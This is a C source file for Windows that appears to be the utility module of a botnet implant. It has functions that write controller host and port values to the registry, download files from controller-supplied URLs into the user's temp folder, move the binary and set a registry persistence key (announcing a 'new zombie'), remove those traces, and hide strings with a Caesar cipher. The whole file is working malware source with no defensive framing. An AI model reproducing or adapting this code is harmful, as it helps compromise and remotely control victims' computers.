#include "windows.h"
#include "winreg.h"
#include "urlmon.h"
#include "cruft_utils.h"

#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Advapi32.lib")

int doNetworkInfoChange(char* pConnInfoKey, char* pRegistryValue, char* pInputCommand) {

    /*
        Change the registry values that hold the port and host data for connecting to
        the server
    */

    printf("[INFO] Received call to network information change function\n");
    
    // Get the network information from the command
    char* pRegistryData = strstr(pInputCommand, " ");
    pRegistryData[strlen(pRegistryData) - 1] = '\0';

    // Increment value to remove space
    pRegistryData++;
    printf("[INFO] Got network data to write -> %s\n", pRegistryData);

    // Decode key and value name
    decodeCipher(pConnInfoKey);
    decodeCipher(pRegistryValue);

    // encode connection data received from controller
    encodeCipher(pRegistryData);

    // Write the data to the registry
    writeRegistryData(pConnInfoKey, pRegistryValue, pRegistryData);

    printf("[SUCCESS] Wrote data to value: %s \n", pRegistryData);

    // Re-encode the key and value names
    encodeCipher(pConnInfoKey);
    encodeCipher(pRegistryValue);

    return 0;

}

int doUrlDownload(char* pInputCommand) {

    /*
        Download a file to the users temp directory.
    */

    // Define a buffer to expand env var into
    char DownloadTarget[MAX_PATH];
    
    // Define string for temp directory in user folder.
    char* pTempDir = "(orfdodssgdwd(_whps_";

    // Decode the string
    decodeCipher(pTempDir);

    printf("[INFO] Received call to download function.\n");

    // identifier for http:// & https:// rls
    const char HTTP[5] = "http";

    // Expand environment variables from temp variable into outpath target
    ExpandEnvironmentStrings((const char*)pTempDir, DownloadTarget, MAX_PATH);

    // Encode the temp dir
    encodeCipher(pTempDir);

    // Parse URL from command
    char* pURL = strstr(pInputCommand, HTTP);

    printf("[SUCCESS] Parsed URL from controller call: %s", pURL);

    // Get the name of the file from the end of the url
    char* pFileName = strrchr(pURL, '/');
    
    // Move passed the / character
    pFileName++;

    // Add filename to the end of the outfile directory
    strcat(DownloadTarget, (const char*)pFileName);
    
    // Add null terminator to the download outfile string 
    DownloadTarget[strlen(DownloadTarget) - 1] = '\0';
    
    // Download the file
    URLDownloadToFile(0, (LPCTSTR)pURL, (LPCTSTR)DownloadTarget, 0, 0);
 
    printf("[SUCCESS] Started file download at location -> %s\n", DownloadTarget);
    return 0;
}

int doUninstallation(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char currentPath[MAX_PATH]) {
    
    /*
        Remove the registry key values from the host
    */

    printf("[INFO] Starting uninstallation process\n");

    // Declare handle for registry key
    HKEY hRegistryKey;

    // Decode variables
    decodeCipher(pConnInfoKey);
    decodeCipher(pPersistKey);
    decodeCipher(pPortValue);
    decodeCipher(pHostValue);
    decodeCipher(pPersistValue);

    // Remove host key
    RegOpenKeyExA(HKEY_CURRENT_USER, pConnInfoKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegDeleteValueA(hRegistryKey, pHostValue);

    // Remove port key
    RegDeleteValueA(hRegistryKey, pPortValue);

    // Remove peristance key
    RegOpenKeyExA(HKEY_CURRENT_USER, pPersistKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegDeleteValueA(hRegistryKey, pPersistValue);

    // Encode variables
    encodeCipher(pConnInfoKey);
    encodeCipher(pPersistKey);
    encodeCipher(pPortValue);
    encodeCipher(pHostValue);
    encodeCipher(pPersistValue);

    printf("[SUCCESS] Completed uninstallation process");

    return 0;
}

int runInfectionCycle(char* pConnInfoKey, char* pPersistKey, char* pHostValue, char* pPortValue, char* pPersistValue, char* pHostData, char* pPortData, char* currentPath, char* persistPath) {
        
        /*
            Add host, port and peristence registry values
        */

        printf("[INFO] Module is not located at infection path\n[INFO] Beginning infection chain\n");
        
        // Decode connection information registry key & persistence registry key
        decodeCipher(pConnInfoKey);
        decodeCipher(pPersistKey);

        // Decode registry values
        decodeCipher(pHostValue); 
        decodeCipher(pPortValue);
        decodeCipher(pPersistValue);

        // Write default host value to registry
        writeRegistryData(pConnInfoKey, pHostValue, pHostData);

        // Write default port value to registry
        writeRegistryData(pConnInfoKey, pPortValue, pPortData);
        printf("[SUCCESS] Wrote default connection values to registry\n[INFO] Renaming file\n");

        // Relocate current file to path specified in the run key value data
        MoveFile(currentPath, persistPath);

        printf("[SUCCESS] File now sits at -> %s\n[INFO] Setting registry key for persistence\n", persistPath);

        // Write persistence key
        writeRegistryData(pPersistKey, pPersistValue, persistPath);

        printf("[INFECTED] New zombie! Successfully wrote registry key. Infection cycle complete.\n");

        // re-encode variables
        encodeCipher(pPersistKey);
        encodeCipher(pPersistValue);
        encodeCipher(pHostValue);
        encodeCipher(pPortValue);
        encodeCipher(pConnInfoKey);

        return 0;
}

int writeRegistryData(char* pRegistryKey, char* pRegistryValue, char * pRegistryData) {

    /*
        Acquire handle and write data to registry
    */

    // Create registry key variable
    HKEY hRegistryKey;

    // Get the length of the input data size for the buffer size parameter of RegSetValueExA
    DWORD dwBuffersize = strlen((const char*)pRegistryData) + 1;
    
    // Open the registry key to acquire handle
    RegOpenKeyExA(HKEY_CURRENT_USER, pRegistryKey, 0, KEY_SET_VALUE, &hRegistryKey);
    RegSetValueExA(hRegistryKey, pRegistryValue, 0, REG_SZ, (const BYTE*)pRegistryData, dwBuffersize);

    return 0;
}

int encodeCipher (char* pStringToEncrypt) {

    /*
        Encode data with caesar cipher
    */
    
    // Declare loop counter
    int counter;

    // Get length of string to encrypt
    int intStringSize = strlen(pStringToEncrypt);

    for (counter = 0; (counter < (intStringSize)); counter++) {
        pStringToEncrypt[counter] = pStringToEncrypt[counter] + 3;
    }
    
    return 0;

}

int decodeCipher (char* pStringToEncrypt) {

    /*
        Decode data with caesar cipher
    */

    // Declare loop counter
    int counter;

    // Get length of string to encrypt
    int intStringSize = strlen(pStringToEncrypt);

    for (counter = 0; (counter < (intStringSize)); counter++) {
        pStringToEncrypt[counter] = pStringToEncrypt[counter] - 3;
    }
    
    return 0;

}